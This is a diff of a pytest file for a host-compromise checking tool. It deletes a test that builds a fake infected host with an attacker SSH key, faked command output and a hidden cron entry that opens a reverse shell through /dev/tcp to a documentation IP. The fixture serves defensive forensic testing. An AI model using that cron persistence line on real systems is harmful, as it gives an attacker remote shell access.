@@ -11,7 +11,6 @@ from urllib.parse import unquote_to_bytes
 
 import pytest
 
-from tests.eval_mocks import HOST_ARGS, HOST_RESULT
 from tests.skill_scripts import SKILLS, doc_blocks, install_fakes, toolbox
 
 REFERENCE = 'compromise-host-check/references/collect.md'
@@ -2087,70 +2086,6 @@ def test_each_collector_emits_exactly_one_coverage_record(tmp_path: Path, shell:
         next(row for row in checks if row['kind'] == 'webroot_file')['status']
         == 'not_requested'
     )
-
-
-def test_the_eval_mock_answers_what_the_script_prints_for_the_jadepuffer_host(
-    tmp_path: Path, shell: str
-):
-    root = _host_tree(tmp_path)
-    (root / 'etc/passwd').write_text('xadmin:x:1001:1001:X:/home/xadmin:/bin/bash\n')
-    (root / 'etc/shadow').write_text('xadmin:$6$never-print-this:20710:0:99999:7:::\n')
-    (root / 'etc/sudoers').write_text('')
-    cron = '* * * * * root sh -c exec 3<>/dev/tcp/203.0.113.50/4444\n'
-    _write(root, 'app/.env', 'DATABASE_PASSWORD=secret\n')
-    _write(
-        root,
-        'home/xadmin/.ssh/authorized_keys',
-        'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5jadepuffer attacker@evil\n',
-    )
-    _write(root, 'etc/cron.d/.sysupdate', cron)
-    _write(root, 'proc/4121/comm', '.sysupdate\n')
-    (root / 'proc/4121/exe').symlink_to('/dev/shm/.x (deleted)')
-    _write(root, 'proc/844/comm', 'alpamon\n')
-    (root / 'proc/844/exe').symlink_to('/usr/bin/alpamon')
-    real_stat = shutil.which('gstat') or shutil.which('stat')
-    assert real_stat
-    stat_fake = f"""for arg do last=$arg; done
-case "$last" in
-  (*'/app/.env') printf '%s\\n' '1789355640:1782864000:1782864000';;
-  (*'/home/xadmin/.ssh/authorized_keys') printf '%s\\n' '1789355575:1789355575';;
-  (*'/etc/cron.d/.sysupdate') printf '%s\\n' '1789355620:1789355620:{len(cron.encode())}:root:644';;
-  (*) exec "$REAL_STAT" "$@";;
-esac"""
-    result = _collect(
-        tmp_path,
-        shell,
-        root,
-        *HOST_ARGS,
-        extra_fakes={
-            'stat': stat_fake,
-            'ssh-keygen': "printf '%s\\n' '256 SHA256:jadepuff no comment (ED25519)'",
-        },
-        REAL_STAT=real_stat,
-        NOW='1795478400',
-        SS_EST=(
-            'ESTAB 0 0 10.0.0.10:49152 203.0.113.50:4444 users:(("fake",pid=4121,fd=4))\n'
-            'ESTAB 0 0 10.0.0.10:49153 198.51.100.20:443 users:(("fake",pid=844,fd=5))'
-        ),
-        DPKG_OUT='??5?????? c /etc/ssh/sshd_config',
-        LAST_OUT=(
-            'xadmin pts/0 203.0.113.50 2026-09-14T03:11:02+00:00 - 2026-09-14T03:42:18+00:00\n'
-            'wtmp begins 2026-07-01T00:00:00+00:00'
-        ),
-    )
-    actual = '\n'.join(result.lines) + '\n'
-    expected_hash = re.search(r'^run .* sha256=([^\n]+)', HOST_RESULT, re.M)
-    assert expected_hash
-    assert expected_hash.group(1) == sha256(_script().encode()).hexdigest()
-    actual = re.sub(
-        r'^(run .* sha256=)[^\n]+',
-        rf'\g<1>{expected_hash.group(1)}',
-        actual,
-        count=1,
-        flags=re.M,
-    )
-
-    assert actual == HOST_RESULT
 
 
 @pytest.mark.parametrize(
